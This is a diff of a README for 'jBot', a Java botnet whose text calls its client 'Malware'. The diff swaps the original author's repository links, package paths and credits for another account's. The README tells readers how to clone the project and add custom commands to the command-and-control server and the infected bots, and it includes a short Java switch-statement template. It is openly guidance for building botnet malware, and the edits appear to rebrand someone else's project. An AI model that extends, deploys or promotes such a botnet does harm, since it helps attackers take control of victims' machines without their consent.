@@ -5,14 +5,14 @@ jBot is the future of Java Botnet Development, the developed software allows jav
 ## Get Started >
 Begin by cloning/downloading this GitHub Repository, this will give you access to the Botnet Malware (Bot), and the Botnet Command and Control (CNC) Servers/Software.
 
-    $ git clone https://github.com/Aaron-Akhtar/jBot.git
+    $ git clone https://github.com/vecnathewhisperd/jBot.git
 
 You can then process the projects into your code editor, and begin adding some custom commands and functionality to the botnet, as seen below.
 
 ### Adding Custom Commands and Functionality >
 jBot uses something called Reflections, this allows the (CNC) software to dynamically find commands you've added to the project, so there is literally one 1 file/class that needs to be made and modified for you to add a custom command to the initial CNC Software, however you will need to add functionality for the actual bots (If your command is sending data to the bots), because, if you don't, the bots won't know what to do.
 
-Start by Creating a Class & Implementing the interface [JBotCommand.java](https://github.com/Aaron-Akhtar/jBot/blob/main/jBot%20-%20Command%20and%20Control/src/main/java/me/aaronakhtar/jbot/command_manager/JBotCommand.java). 
+Start by Creating a Class & Implementing the interface [JBotCommand.java](https://github.com/vecnathewhisperd/jBot/blob/main/jBot%20-%20Command%20and%20Control/src/main/java/me/vecnathewhisperd/jbot/command_manager/JBotCommand.java). 
 **MAKE SURE TO LOCATE YOUR NEW COMMAND CLASS INTO THE FOLLOWING PROJECT PACKAGE/DIRECTORY:** `me.aaronakhtar.jbot.command_manager.commands`
 Example Command Class:
 
@@ -54,7 +54,7 @@ Whenever a CNC-CLIENT executes your command, whatever is in `doAction(...)` will
 ### Integrating your new command with your Bot (Malware) >
 Because of the ease-of-usage concept I want to go by, I decided to make the Malware simple, and not over complicated at all, in order to integrate your new command, simply **make sure you add the following code into your Command Class `doAction(...)` function in the CNC Software:  `Utilities.executeCommandToNetwork("command here");`**
 
-In your Malware [Main.java](https://github.com/Aaron-Akhtar/jBot/blob/main/jBot%20-%20Malware%20Bot/src/main/java/me/aaronakhtar/jbot/Main.java) class, simply modify the switch-statement to integrate your new command, and provide some functionality, below is an example implementation:
+In your Malware [Main.java](https://github.com/vecnathewhisperd/jBot/blob/main/jBot%20-%20Malware%20Bot/src/main/java/me/vecnathewhisperd/jbot/Main.java) class, simply modify the switch-statement to integrate your new command, and provide some functionality, below is an example implementation:
 ```java
 switch (commandArgs[0].toLowerCase(Locale.ROOT)){  
     // example  
@@ -99,4 +99,4 @@ mvn package
 
 # Credits:
 Me.
-https://twitter.com/D3vAaron
+https://github.com/vecnathewhisperd
